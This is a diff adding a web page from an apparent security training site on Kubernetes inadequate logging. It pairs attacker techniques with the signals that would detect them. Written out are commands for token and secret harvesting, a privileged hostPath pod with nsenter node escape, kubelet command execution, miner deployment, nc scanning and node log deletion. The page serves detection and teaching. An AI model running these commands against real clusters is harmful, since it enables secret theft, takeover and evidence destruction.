@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>K05: Inadequate Logging and Monitoring - Attack Vectors</title>
+    <link rel="stylesheet" href="/platform/frontend/js/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .doc-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+
+        .back-nav:hover {
+            background-color: rgba(245, 158, 11, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 40px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(245, 158, 11, 0.1);
+        }
+
+        .content h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            text-shadow: none;
+        }
+
+        .content h2 {
+            color: var(--secondary-color);
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .content h3 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 12px;
+        }
+
+        .content h4 {
+            color: var(--secondary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .content p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .content ul, .content ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .content li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .content code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', monospace;
+            border: 1px solid var(--border-color);
+        }
+
+        .content pre {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--primary-color);
+        }
+
+        .content blockquote {
+            border-left: 4px solid var(--primary-color);
+            padding-left: 20px;
+            margin: 20px 0;
+            background: rgba(245, 158, 11, 0.05);
+            padding: 15px 20px;
+            border-radius: 4px;
+        }
+
+        .content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table th {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(251, 191, 36, 0.2));
+            color: var(--primary-color);
+            padding: 12px;
+            text-align: left;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table td {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+        }
+
+        .content table tr:hover {
+            background: rgba(245, 158, 11, 0.05);
+        }
+
+        .content a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .content a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        .content strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+
+        .toc {
+            background: rgba(245, 158, 11, 0.05);
+            border: 1px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .toc h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toc a:hover {
+            color: var(--primary-color);
+        }
+
+        .toc a:before {
+            content: "▸";
+            color: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="doc-container">
+        <a href="/learn/kubernetes" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back
+        </a>
+
+        <div class="content">
+            <h1>K05: Inadequate Logging and Monitoring - Attack Vectors</h1>
+
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding">Understanding the Detection Gap</a></li>
+<li><a href="#core-attack-flow">Core Attack Flow (Undetected)</a></li>
+<li><a href="#unnoticed-activity">Attacker Activity That Goes Unnoticed</a></li>
+<li><a href="#chaining">Chaining Blind Spots into a Sustained Breach</a></li>
+</ul>
+</div>
+
+<h2 id="understanding">Understanding the Detection Gap</h2>
+
+<blockquote>
+<p><strong>⚠️ EDUCATIONAL PURPOSE ONLY</strong> &mdash; the techniques below are shown so you can enable the telemetry that would catch them in clusters you own or are authorised to test.</p>
+</blockquote>
+
+<p>K05 is unusual among the OWASP Kubernetes Top 10: there is no payload to send and no endpoint to exploit. The "attack" is simply that <strong>ordinary malicious activity produces no alert and leaves no durable trace</strong>. Every technique below is something an attacker does <em>after</em> gaining some foothold&mdash;and each one is invisible precisely because a specific piece of telemetry is disabled, uncollected, or unwatched.</p>
+
+<p>So the right way to read this page is as a checklist of <strong>events your cluster should be screaming about</strong>. For each attacker action we note the signal that would have caught it, and the K05 failure that let it pass in silence.</p>
+
+<h3 id="core-attack-flow">Core Attack Flow (Undetected)</h3>
+
+<pre><code>1. Foothold
+   &darr;   (app RCE, exposed kubelet/API, leaked token)
+   No runtime sensor -&gt; the initial shell is never recorded
+2. Reconnaissance
+   &darr;   list namespaces, secrets, service accounts, nodes
+   Audit off/Metadata-only -&gt; enumeration blends into normal traffic
+3. Privilege escalation
+   &darr;   create privileged pod, bind cluster-admin, mint tokens
+   No alert on RBAC changes -&gt; escalation raises no flag
+4. Objective
+   &darr;   deploy miner, read secrets, exfiltrate data, install persistence
+   No alert on odd registries / egress -&gt; objective completes quietly
+5. Cleanup
+   &darr;   delete node-local pod logs, remove pods
+   Logs not shipped off-node -&gt; the only evidence is destroyed</code></pre>
+
+<h2 id="unnoticed-activity">Attacker Activity That Goes Unnoticed</h2>
+
+<h3>1. Interactive Shell in a Pod (<code>kubectl exec</code> / attach)</h3>
+
+<p>An attacker with a valid credential or a compromised operator session opens a shell inside a running container to explore and stage further actions.</p>
+
+<pre><code>kubectl exec -it payments-api-6d4 -n prod -- /bin/sh
+# then, inside the container:
+$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
+$ env | grep -i 'key\|secret\|password'
+$ curl -s https://kubernetes.default/api/v1/namespaces/prod/secrets \
+    -H "Authorization: Bearer $(cat .../token)" --insecure</code></pre>
+
+<p><strong>Signal that should fire</strong>: API audit records an <code>exec</code> sub-resource on a pod; a runtime sensor records a shell process (<code>/bin/sh</code>) spawned inside a container that normally runs a single application binary.</p>
+<p><strong>K05 failure</strong>: Audit logging off (no exec record) <em>and</em> no runtime sensor (no process record) &mdash; the interactive session leaves no trace at all.</p>
+
+<h3>2. Creating a Privileged / hostPath Pod</h3>
+
+<p>To escape to the node or mount host filesystems, the attacker schedules a pod with dangerous settings.</p>
+
+<pre><code>apiVersion: v1
+kind: Pod
+metadata: { name: debug-tools, namespace: kube-system }
+spec:
+  hostPID: true
+  containers:
+  - name: shell
+    image: alpine
+    securityContext: { privileged: true }
+    volumeMounts: [{ name: host, mountPath: /host }]
+    command: ["sleep", "infinity"]
+  volumes: [{ name: host, hostPath: { path: / } }]
+# nsenter into PID 1 on the node from here, or chroot /host</code></pre>
+
+<p><strong>Signal that should fire</strong>: API audit records a <code>create pod</code> with <code>privileged: true</code>/<code>hostPID: true</code>; admission logs record the decision; a runtime sensor records a sensitive host mount.</p>
+<p><strong>K05 failure</strong>: No alerting rule on privileged-pod creation, so the event&mdash;even if logged&mdash;is never surfaced to a human.</p>
+
+<h3>3. Reading Secrets and ConfigMaps at Scale</h3>
+
+<pre><code>kubectl get secrets --all-namespaces -o json &gt; /tmp/all-secrets.json
+kubectl get configmaps -A -o yaml | grep -iE 'token|key|password'</code></pre>
+
+<p><strong>Signal that should fire</strong>: API audit at <code>Metadata</code> level shows many <code>get/list secrets</code> requests from one identity; at <code>RequestResponse</code> level for the <code>secrets</code> resource it shows exactly which secrets were read.</p>
+<p><strong>K05 failure</strong>: Secrets logged only at <code>None</code>/<code>Metadata</code>, or not at all, so bulk secret harvesting is indistinguishable from routine reads and never alerted.</p>
+
+<h3>4. Service-Account Token Abuse</h3>
+
+<p>A compromised workload uses its auto-mounted token to talk to the API server&mdash;something that particular workload never normally does.</p>
+
+<pre><code>TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default/apis/rbac.authorization.k8s.io/v1/clusterrolebindings</code></pre>
+
+<p><strong>Signal that should fire</strong>: API audit ties the request to a specific <code>system:serviceaccount:...</code> identity; a baseline of normal per-SA behaviour makes the sudden API enumeration anomalous.</p>
+<p><strong>K05 failure</strong>: No audit trail keyed by identity, and no behavioural baseline, so a token being used far outside its normal scope raises nothing.</p>
+
+<h3>5. Anonymous / Unauthenticated API and kubelet Probing</h3>
+
+<pre><code># Probing the API server as system:anonymous
+curl -sk https://API_SERVER:6443/api/v1/namespaces/default/pods
+# Probing the read/write kubelet API directly on a node
+curl -sk https://NODE:10250/pods
+curl -sk https://NODE:10250/run/&lt;ns&gt;/&lt;pod&gt;/&lt;container&gt; -d "cmd=id"</code></pre>
+
+<p><strong>Signal that should fire</strong>: API audit records requests from <code>system:anonymous</code>; kubelet logs record unauthenticated access; a spike of 401/403 or, worse, 200s to the kubelet is a strong indicator.</p>
+<p><strong>K05 failure</strong>: kubelet access not logged/forwarded and API audit disabled, so external probing and direct-to-node command execution go unseen.</p>
+
+<h3>6. Container Escape and On-Node Activity</h3>
+
+<pre><code># From a privileged/hostPID pod, break out to the node:
+nsenter -t 1 -m -u -i -n -p -- bash
+# Now acting as root on the host: read kubelet creds, other pods' secrets,
+# tamper with the container runtime, add an SSH key.</code></pre>
+
+<p><strong>Signal that should fire</strong>: A runtime sensor records <code>nsenter</code>/namespace-change syscalls, a shell in the host mount namespace, and access to sensitive host paths (kubelet kubeconfig, <code>/etc/kubernetes</code>).</p>
+<p><strong>K05 failure</strong>: No runtime sensor on the node, so the escape&mdash;the single most serious event in a cluster&mdash;produces zero telemetry.</p>
+
+<h3>7. Cryptominer Deployment</h3>
+
+<pre><code>kubectl run xmrig --image=badregistry.example/miner:latest \
+  --restart=Always --requests=cpu=3
+# or a Deployment scaled across every node, disguised as "metrics-agent"</code></pre>
+
+<p><strong>Signal that should fire</strong>: Image pull from an unknown/untrusted registry; a runtime sensor records a mining binary and outbound connections to a mining pool; sustained high CPU across pods.</p>
+<p><strong>K05 failure</strong>: No alert on registries outside the allow-list and no runtime/egress monitoring, so mining runs until it shows up on the cloud bill.</p>
+
+<h3>8. Lateral Movement Across Namespaces and Nodes</h3>
+
+<pre><code># Pivot using discovered tokens / network reachability
+kubectl --token=$STOLEN get pods -n other-team
+# East-west scanning from a compromised pod
+for ip in 10.0.0.{1..254}; do nc -z -w1 $ip 6443 2>/dev/null && echo $ip; done</code></pre>
+
+<p><strong>Signal that should fire</strong>: Audit shows one identity acting across many namespaces; network-policy logs / flow logs show unexpected east-west scanning; a runtime sensor records scanning tools running in a pod.</p>
+<p><strong>K05 failure</strong>: No network flow logging and no per-identity audit correlation, so movement between tenants and nodes is invisible.</p>
+
+<h3>9. Tampering With or Deleting the Evidence</h3>
+
+<pre><code># On a node the attacker controls, wipe node-local pod logs:
+rm -f /var/log/pods/*/*/*.log
+rm -f /var/log/containers/*.log
+# Delete the pods they used, so `kubectl get pods` shows nothing:
+kubectl delete pod debug-tools -n kube-system</code></pre>
+
+<p><strong>Signal that should fire</strong>: If logs were already shipped off-node to append-only storage, the deletion changes nothing an investigator relies on; the delete API call is itself audited.</p>
+<p><strong>K05 failure</strong>: Logs kept only on the node the attacker controls, with no off-cluster copy, so cleanup permanently destroys the trail.</p>
+
+<h3>Attacker Action &rarr; Missing Signal Summary</h3>
+
+<table>
+<thead>
+<tr><th>Attacker action</th><th>Signal that should catch it</th><th>K05 failure that hides it</th></tr>
+</thead>
+<tbody>
+<tr><td>Exec/attach into pod</td><td>API audit exec + runtime shell event</td><td>Audit off; no runtime sensor</td></tr>
+<tr><td>Privileged/hostPath pod</td><td>Audit create + admission log</td><td>No alert on privileged create</td></tr>
+<tr><td>Bulk secret reads</td><td>Audit on <code>secrets</code> resource</td><td>Secrets at None/Metadata only</td></tr>
+<tr><td>SA token abuse</td><td>Per-identity audit + baseline</td><td>No identity-keyed audit trail</td></tr>
+<tr><td>Anonymous API/kubelet probe</td><td>Audit anonymous + kubelet logs</td><td>kubelet unlogged; audit off</td></tr>
+<tr><td>Container escape</td><td>Runtime syscall/mount events</td><td>No runtime sensor on nodes</td></tr>
+<tr><td>Cryptominer deploy</td><td>Registry allow-list + egress/CPU</td><td>No registry or runtime monitoring</td></tr>
+<tr><td>Lateral movement</td><td>Flow logs + cross-ns audit</td><td>No network logging/correlation</td></tr>
+<tr><td>Evidence deletion</td><td>Off-node append-only storage</td><td>Logs only on the node</td></tr>
+</tbody>
+</table>
+
+<h2 id="chaining">Chaining Blind Spots into a Sustained Breach</h2>
+
+<p>Individually, each missing signal is a gap. Together they compound into an attacker who can operate indefinitely:</p>
+
+<pre><code>App RCE gives a shell              -&gt; no runtime sensor: shell unseen
+        +
+SA token reads all secrets         -&gt; secrets not audited: theft unseen
+        +
+Privileged pod escapes to node     -&gt; no runtime sensor: escape unseen
+        +
+Miner pulled from odd registry     -&gt; no registry alert: workload unseen
+        +
+Node-local logs deleted            -&gt; nothing shipped off-node: trail gone
+        =  weeks-to-months of undetected control-plane compromise</code></pre>
+
+<p>Another common chain, driven by a leaked credential rather than an app bug:</p>
+
+<pre><code>Leaked kubeconfig / CI token       -&gt; no per-identity alerting
+        -&gt; bind cluster-admin (RBAC change unaudited)
+        -&gt; create privileged DaemonSet on every node
+        -&gt; harvest secrets cluster-wide (secret reads unlogged)
+        -&gt; exfiltrate over normal egress (no flow logging)
+        =  full cluster takeover, first noticed via an external report</code></pre>
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>The attack is silence</strong>&mdash;K05 has no payload; the exploit is that malicious actions produce no alert and no durable trace.</li>
+<li><strong>Every technique maps to a missing signal</strong>&mdash;exec, privileged pods, secret reads, token abuse, escape, mining, and lateral movement each have a telemetry source that would catch them.</li>
+<li><strong>Runtime blindness is the worst gap</strong>&mdash;without a process-level sensor, in-container post-exploitation and node escape are completely invisible.</li>
+<li><strong>Node-local logs are the attacker's to delete</strong>&mdash;evidence must be shipped off-cluster in real time or it is destroyed during cleanup.</li>
+<li><strong>Gaps compound</strong>&mdash;several individually-tolerable blind spots combine into indefinite, unscoped dwell time.</li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="prevention.html">Prevention Guide</a></strong>: Turn each missing signal into an enabled, alerting control</li>
+<li><strong><a href="examples.html">Code Examples</a></strong>: Insecure vs. secure audit policy, Falco rules, and pipelines</li>
+<li><strong><a href="/learn/kubernetes">Kubernetes Learning Path</a></strong>: Continue the OWASP Kubernetes Top 10</li>
+<li><strong><a href="/practice">Practice</a></strong>: Apply what you've learned in hands-on exercises</li>
+</ul>
+
+        </div>
+    </div>
+</body>
+</html>
